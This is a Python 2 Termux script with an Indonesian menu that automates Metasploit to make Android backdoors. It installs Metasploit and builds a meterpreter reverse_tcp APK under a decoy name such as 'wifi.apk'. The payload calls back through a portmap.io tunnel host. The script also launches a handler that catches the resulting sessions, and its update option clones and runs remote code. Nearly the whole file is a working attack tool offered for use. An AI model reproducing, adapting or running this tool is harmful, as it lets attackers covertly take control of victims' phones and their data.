#!/bin/python

import os,sys,time

putih="\x1b[1;97m"
merah="\x1b[1;91m"
hijau="\x1b[1;92m"
red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def flush(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)

def bersih():
    os.system("clear")

def menu():
    bersih()
    print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
    print "\033[36;1mAuthor\033[37;1m  : \033[33;1mCyber noob"
    print "\033[36;1mYoutube\033[37;1m : \033[33;1mSeven Gaming"
    print "\033[36;1mGithub\033[37;1m  : \033[33;1mhttps://github.com/Seven-Gaming"
    print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
    print
    print "\033[32;1m         [+] MENU [+]"
    print "\033[37;1m---------------------------------"
    print "\033[36;1m[1] \033[33;1mInstall metasploit"
    print "\033[36;1m[2] \033[33;1mBuat backdoor beda jaringan"
    print "\033[36;1m[3] \033[33;1mRemote Backdoor"
    print "\033[36;1m[4] \033[33;1mUpdate Script"
    print "\033[36;1m[0] \033[31;1mKeluar/Exit"
    print
    pil = raw_input("\033[37;1mPilih Menu : ")
    if pil == "1":
        print "\033[35;1mSiapkan kopi penginstallannya membutuhkan waktu 5-10 kalah sinyal stabil ^_^"
        time.sleep(2)
        os.system("pkg update && pkg upgrade -y")
        os.system("pkg install unstable-repo")
        os.system("pkg install metasploit -y")
        print "\033[32;1mPenginstallan selesai....."
        time.sleep(2)
        menu()
    elif pil == "2":
        bersih()
        print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
        print "\033[36;1mAuthor\033[37;1m  : \033[33;1mCyber noob"
        print "\033[36;1mYoutube\033[37;1m : \033[33;1mSeven Gaming"
        print "\033[36;1mGithub\033[37;1m  : \033[33;1mhttps://github.com/Seven-Gaming"
        print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
        print
        print "\033[37;1mContoh nama backdoor \033[33;1m==> \033[31;1mwifi.apk"
        name=raw_input("Name \033[37;1m: ")
        print "\033[37;1m-----------------------------------------"
        print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
        print "contoh config saya"
        print "hackersport-43516.portmap.io:\033[31;1m43516"
        print "\033[37;1m5 Dikit Angka yg berwarna \033[31;1mmerah^ \033[37;1mUntuk portnya"
        port=raw_input("\033[31;1mPort \033[37;1m: ")
        print "\033[37;1m-----------------------------------------"
        print "\x1b[1;97mMasukan LHOST"
        print "Contoh menggunakan config saya"
        print "\x1b[1;91mhackersport-43516.portmap.io"
        print "\x1b[1;91m                 ^"
        lh=raw_input("\033[31;1mlhost \033[37;1m: ")
        bersih()
        print hijau+"[*] GENERATE BACKDOOR [+] \n"
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
        time.sleep(4)
        os.system('mv '+str(name)+'.apk /storage/emulated/0/')
        time.sleep(4)
        os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity') 
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif pil == "3":
        bersih()
        print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
        print "\033[36;1mAuthor\033[37;1m  : \033[33;1mCyber noob"
        print "\033[36;1mYoutube\033[37;1m : \033[33;1mSeven Gaming"
        print "\033[36;1mGithub\033[37;1m  : \033[33;1mhttps://github.com/Seven-Gaming"
        print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
        os.system('rm -rf ip.txt')
        os.system('ifconfig > ip.txt')
        f = open('ip.txt')
        g = merah+f.read()
        print
        print g
        f.close
        print "\x1b[1;91m------------------------------------------"
        print " Masukan IP tun0 inet: "
        lh =raw_input(" LHOST : ")
        if lh== '':
          print merah+"[!] Harus DiIsi [!]"
          time.sleep(1)
          bersih()
        print "\033[37;1m-----------------------------------------"
        print "\x1b[1;97mMasukan LPORT"
        print "contoh"
        print "hackersport-43516.portmap.io:43516=>\x1b[1;91m8080"
        print "\x1b[1;91m                                      ^"
        print "\033[37;1m-----------------------------------------"
        lp =raw_input("LPORT : ")
        if lp== '':
          print "[!] Harus DiIsi [!]"
          time.sleep(1)
          bersih()
        else:
          bersih()
          os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
          raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
          bersih()
    elif pil == "4":
        print "\033[33;1mUpdate installing...."
        time.sleep(1)
        os.system("rm -fr Hackfb")
        os.system("git clone https://github.com/Seven-Gaming/msfnob")
        time.sleep(1)
        os.system("cd msfnob")
        os.system("python2 msfnob.py")
        menu()
    elif pil == "0":
        os.system("exit")
        print
        print "\033[36;1m==================================="
        print "\033[33;1mTerima Kasih Telah Menggukan msfnob"
        print "\033[36;1m==================================="
        time.sleep(2)
    else:
        print "\033[31;1mMasukan input yg benar"
        time.sleep(2)
        bersih()
        menu()

menu()

